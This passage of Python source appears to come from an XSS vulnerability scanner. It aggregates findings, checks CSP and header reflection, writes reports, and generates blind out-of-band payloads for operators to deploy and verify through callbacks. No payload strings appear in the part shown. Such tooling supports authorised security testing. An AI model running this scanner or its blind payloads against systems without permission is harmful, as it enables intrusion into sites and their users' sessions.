                    all_findings.extend(findings)
                    if reflection:
                        blind_payloads.extend(reflection.get("blind_payloads", []))
                    if findings:
                        top = findings[0]
                        log.info(
                            f"    [{done:>3}/{len(surfaces)}] {top.xss_type:<10} "
                            f"{top.severity:<8} {top.context:<20} "
                            f"{_redact_url(result['url'], 40)} param={result['param']}"
                        )
                    elif done % 20 == 0:
                        log.info(f"    [{done:>3}/{len(surfaces)}] processing...")
                except Exception as e:
                    log.debug(f"    future error: {type(e).__name__}: {e}")
    except KeyboardInterrupt:
        interrupted = True
        log.warning("  interrupted — writing partial results")

    # ── Blind findings as first-class candidates
    all_findings.extend(blind_payloads_to_findings(blind_payloads))

    if test_dom:
        log.info("")
        log.info("  DOM XSS static analysis...")
        dom_findings = run_dom_analysis(session, outdir)
        all_findings.extend(dom_findings)
        log.info(f"    {len(dom_findings)} DOM finding(s)")

    log.info("")
    log.info("  CSP analysis...")
    csp_seen: set[str] = set()
    for s in surfaces[:50]:
        host = urllib.parse.urlparse(s["url"]).hostname or ""
        if host in csp_seen:
            continue
        csp_seen.add(host)
        resp = session.get(s["url"], timeout=8)
        if resp:
            all_findings.extend(analyze_csp(resp, s["url"]))
    log.info(f"    {sum(1 for f in all_findings if f.xss_type == 'csp')} CSP finding(s)")

    if test_headers:
        log.info("")
        log.info("  Header reflection test...")
        header_seen: set[str] = set()
        for s in surfaces[:50]:
            host = urllib.parse.urlparse(s["url"]).hostname or ""
            if host in header_seen:
                continue
            header_seen.add(host)
            all_findings.extend(test_header_injection(session, s["url"]))
        log.info(f"    {sum(1 for f in all_findings if f.xss_type == 'header')} header finding(s)")

    # ── Dedupe (highest-confidence wins)
    seen_f: dict[str, XSSFinding] = {}
    for f in all_findings:
        h = f.finding_hash
        existing = seen_f.get(h)
        if existing is None or (f.confirmed, f.confidence) > (existing.confirmed, existing.confidence):
            seen_f[h] = f
    deduped = list(seen_f.values())
    for f in deduped:
        f.auth_enabled = auth_on
        if not f.first_seen:
            f.first_seen = _db_now()

    SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    deduped.sort(key=lambda f: (
        SEV_ORDER.get(f.severity, 5), 0 if f.confirmed else 1,
        -f.confidence, f.target,
    ))

    elapsed = time.monotonic() - start
    by_severity = {k: 0 for k in SEV_ORDER}
    by_type: dict[str, int] = {}
    by_context: dict[str, int] = {}
    confirmed_list = [f for f in deduped if f.confirmed]

    for f in deduped:
        by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
        by_type[f.xss_type] = by_type.get(f.xss_type, 0) + 1
        if f.context:
            by_context[f.context] = by_context.get(f.context, 0) + 1

    # ── Outputs
    (outdir / "xss_candidates.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.xss_type}\t{f.context}\t{f.severity}\t"
            f"{f.confidence}\t{'CONFIRMED' if f.confirmed else 'candidate'}\t{f.evidence[:140]}"
            for f in deduped
        ) + ("\n" if deduped else "")
    )

    confirmed_refl = [f for f in confirmed_list
                      if f.xss_type in ("reflected", "stored", "header")]
    (outdir / "xss_confirmed.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.context}\t{f.payload[:150]}"
            for f in confirmed_refl
        ) + ("\n" if confirmed_refl else "")
    )

    dom_list = [f for f in deduped if f.xss_type == "dom"]
    (outdir / "xss_dom.txt").write_text(
        "\n".join(
            f"{f.details.get('js_url', f.target)}\t"
            f"{f.details.get('source', '')}\t"
            f"{f.details.get('sink', '')}\t"
            f"{f.evidence[:120]}"
            for f in dom_list
        ) + ("\n" if dom_list else "")
    )

    # Blind OOB payloads — raw generation list for manual deployment.
    # Each row is (target, param, token, payload) so operators can match
    # a payload back to a Huginn token during triage.
    (outdir / "xss_blind.txt").write_text(
        "\n".join(
            f"{b['target']}\t{b['param']}\t{b['oob_token']}\t{b['payload']}"
            for b in blind_payloads
        ) + ("\n" if blind_payloads else "")
    )

    # CSP surfaces — kept in the original 4-column shape for downstream
    # readers. We pull them out of deduped[] since analyze_csp() now emits
    # proper XSSFinding objects.
    csp_list = [f for f in deduped if f.xss_type == "csp"]
    (outdir / "xss_csp.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.payload}\t{f.severity}\t{f.evidence[:120]}"
            for f in csp_list
        ) + ("\n" if csp_list else "")
    )

    blind_findings = [f for f in deduped if f.xss_type == "blind"]
    blind_confirmed = [f for f in blind_findings if f.confirmed]

    # ── JSON report ────────────────────────────────────────────────────────
    report = {
        "schema_version": FINDING_SCHEMA_VERSION,
        "generated_at":   datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file":     str(urls_file),
        "scan_id":        scan_id,
        "interrupted":    interrupted,
        "config": {
            "test_stored":   test_stored,
            "test_dom":      test_dom,
            "test_headers":  test_headers,
            "oob_mode":      oob["mode"],
            "oob_base_url":  oob["base_url"],
            "authenticated": auth_on,
            "max_surfaces":  eff_max,
            "rate_limit":    eff_rate,
            "concurrency":   eff_conc,
            "timeout":       eff_timeout,
            "verify_tls":    verify_tls,
        },
        "totals": {
            "urls_input":      len(urls),
            "surfaces_tested": len(surfaces),
            "total_findings":  len(deduped),
            "confirmed":       len(confirmed_list),
            "blind_findings":  len(blind_findings),
            "blind_confirmed": len(blind_confirmed),
            "blind_payloads":  len(blind_payloads),
            "dom_findings":    len(dom_list),
            "csp_surfaces":    len(csp_list),
            "critical":        by_severity.get("CRITICAL", 0),
            "high":            by_severity.get("HIGH", 0),
            "medium":          by_severity.get("MEDIUM", 0),
            "low":             by_severity.get("LOW", 0),
            "info":            by_severity.get("INFO", 0),
        },
        "summary": {
            "by_severity": by_severity,
            "by_type":     dict(sorted(by_type.items(), key=lambda kv: -kv[1])),
            "by_context":  dict(sorted(by_context.items(), key=lambda kv: -kv[1])),
            "waf_hits":    waf_seen,
        },
        "results":        results,
        "findings":       [f.to_dict() for f in deduped],
        "blind_payloads": blind_payloads,
        # Backwards-compat block for readers that expect the old shape.
        "csp_surfaces": [
            {
                "target":   f.target,
                "surface":  f.payload,
                "severity": f.severity,
                "evidence": f.evidence,
            }
            for f in csp_list
        ],
    }

    json_path = outdir / "xss_findings.json"
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    # ── DB self-sync (post-scan) ───────────────────────────────────────────
    if scan_id is not None:
        _self_sync(scan_id, deduped)
    else:
        log.debug("  DB sync: no --scan-id provided, skipping")

    # ── Optional inline OOB verification ───────────────────────────────────
    if (oob_poll_wait > 0 and blind_findings and not blind_confirmed
            and oob["base_url"]):
        log.info("")
        log.info(f"  OOB verification (polling up to {oob_poll_wait}s/token)...")
        try:
            verify_blind_findings(
                outdir,
                oob_base_url=oob["base_url"],
                read_key=oob["read_key"] or None,
                max_wait=oob_poll_wait,
                scan_id=scan_id,
            )
        except Exception as e:
            log.warning(f"    OOB verification failed: {type(e).__name__}: {e}")

    # ── CLI summary ────────────────────────────────────────────────────────
    log.info("")
    log.info("  Outputs :")
    log.info(f"    {json_path.name:<28} {len(deduped):>5} finding(s)")
    log.info(f"    xss_candidates.txt           {len(deduped):>5} candidate(s)")
    log.info(f"    xss_confirmed.txt            {len(confirmed_list):>5} confirmed")
    log.info(f"    xss_dom.txt                  {len(dom_list):>5} DOM finding(s)")
    log.info(f"    xss_blind.txt                {len(blind_payloads):>5} blind payload(s)")
    log.info(f"    xss_csp.txt                  {len(csp_list):>5} CSP surface(s)")

    log.info("")
    log.info(
        f"  Severity : CRITICAL={by_severity.get('CRITICAL', 0)}  "
        f"HIGH={by_severity.get('HIGH', 0)}  "
        f"MEDIUM={by_severity.get('MEDIUM', 0)}  "
        f"LOW={by_severity.get('LOW', 0)}  "
        f"INFO={by_severity.get('INFO', 0)}"
    )
    if by_type:
        log.info("  Type     : " + " · ".join(f"{k}({v})" for k, v in by_type.items()))
    if by_context:
        log.info("  Context  : " + " · ".join(f"{k}({v})" for k, v in by_context.items()))
    if waf_seen:
        log.info("  WAF      : " + " · ".join(f"{k}({v})" for k, v in waf_seen.items()))

    if blind_findings:
        log.info("")
        log.info(
            f"  Blind OOB: {len(blind_findings)} candidate(s), "
            f"{len(blind_confirmed)} confirmed via callback"
        )
        if blind_payloads and not blind_confirmed:
            log.info("    Deploy payloads from xss_blind.txt, then run:")
            log.info(
                "      python -m auditing_tools.xss_finder "
                f"--verify-oob --oob-poll-wait 120"
                + (f" --scan-id {scan_id}" if scan_id else "")
            )

    if confirmed_list:
        log.info("")
        log.info("  Confirmed findings (top 10):")
        for f in confirmed_list[:10]:
            log.info(
                f"    [{f.severity:<8}] {f.xss_type:<10} {f.context:<20} "
                f"{f.param:<16} {_redact_url(f.target, 50)}"
            )

    if interrupted:
        log.info("")
        log.warning("  Partial results written — scan was interrupted")

    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty_report(outdir: Path, input_file: Path, start: float) -> Path:
    outdir.mkdir(parents=True, exist_ok=True)
    report = {
        "schema_version": FINDING_SCHEMA_VERSION,
        "generated_at":   datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file":     str(input_file),
        "config":         {},
        "totals": {
            "urls_input": 0, "surfaces_tested": 0, "total_findings": 0,
            "confirmed": 0, "blind_findings": 0, "blind_confirmed": 0,
            "blind_payloads": 0, "dom_findings": 0, "csp_surfaces": 0,
            "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0,
        },
        "summary": {"by_severity": {}, "by_type": {}, "by_context": {}},
        "results": [],
        "findings": [],
        "blind_payloads": [],
        "csp_surfaces": [],
    }
    path = outdir / "xss_findings.json"
    path.write_text(json.dumps(report, indent=2) + "\n")
    for name in ("xss_candidates.txt", "xss_confirmed.txt", "xss_dom.txt",
                 "xss_blind.txt", "xss_csp.txt"):
        (outdir / name).write_text("")
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE CLI
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[logging.StreamHandler(sys.stdout)],
    )
    base = Path(__file__).resolve().parent.parent
    default_input = base / "output" / "gf_xss.txt"
    if not default_input.exists():
        default_input = base / "output" / "urls_with_params.txt"
    if not default_input.exists():
        default_input = base / "output" / "all_urls.txt"
    out = base / "output"

    parser = argparse.ArgumentParser(
        description="Argus XSS Auditor v4.0 (standalone)"
    )
    parser.add_argument("--input", type=Path, default=default_input)
    parser.add_argument("--output", type=Path, default=out)
    parser.add_argument("--cookie", help="Session cookie (shortcut for --header Cookie=...)")
    parser.add_argument("--header", action="append", default=[],
                        metavar="NAME=VALUE",
                        help="Extra header (repeatable, e.g. --header 'Authorization=Bearer xxx')")
    parser.add_argument("--oob-domain",
                        help="OOB domain (Huginn). Path or subdomain form.")
    parser.add_argument("--oob-mode", choices=["path", "subdomain"], default=None,
                        help="Huginn payload mode (default: config OAST_MODE or 'path')")
    parser.add_argument("--no-stored", action="store_true")
    parser.add_argument("--no-dom", action="store_true")
    parser.add_argument("--test-headers", action="store_true",
                        help="Test HTTP header reflection (opt-in, slow)")
    parser.add_argument("--max-surfaces", type=int, default=None)
    parser.add_argument("--concurrency",   type=int, default=None)
    parser.add_argument("--rate-limit",    type=int, default=None)
    parser.add_argument("--timeout",       type=int, default=None)
    parser.add_argument("--scan-id",       type=int, default=None,
                        help="DB scan ID for self-sync")
    parser.add_argument("--verify-oob", action="store_true",
                        help="Standalone mode: only poll Huginn for existing "
                             "blind findings and update xss_findings.json")
    parser.add_argument("--oob-poll-wait", type=int, default=0,
                        help="Poll OOB for N seconds per token after the scan "
                             "(0 = single pass)")
    args = parser.parse_args()

    headers: dict[str, str] = {}
    for h in args.header:
        if "=" in h:
            k, v = h.split("=", 1)
            headers[k.strip()] = v.strip()
    if args.cookie:
        headers["Cookie"] = args.cookie

    try:
        if args.verify_oob:
            oob = _oob_settings()
            base_url = oob["base_url"]
            if args.oob_domain:
                base_url = (
                    args.oob_domain
                    if args.oob_domain.startswith(("http://", "https://"))
                    else f"https://{args.oob_domain}"
                ).rstrip("/")
            if not base_url:
                log.error(
                    "--verify-oob requires OOB config (OAST_DOMAIN) or --oob-domain"
                )
                sys.exit(2)
            result = verify_blind_findings(
                args.output,
                oob_base_url=base_url,
                read_key=oob["read_key"] or None,
                max_wait=max(args.oob_poll_wait, 0),
                scan_id=args.scan_id,
            )
            log.info(f"  OOB verify result: {result}")
        else:
            run_xss_scan(
                args.input, args.output,
                headers=headers or None,
                oob_domain=args.oob_domain,
                oob_mode=args.oob_mode,
                test_stored=not args.no_stored,
                test_dom=not args.no_dom,
                test_headers=args.test_headers,
                max_surfaces=args.max_surfaces,
                concurrency=args.concurrency,
                rate_limit=args.rate_limit,
                timeout=args.timeout,
                scan_id=args.scan_id,
                oob_poll_wait=args.oob_poll_wait,
            )
    except KeyboardInterrupt:
        log.warning("interrupted by user")
        sys.exit(130)
    except Exception as e:
        log.error(f"failed: {type(e).__name__}: {e}")
        sys.exit(1)
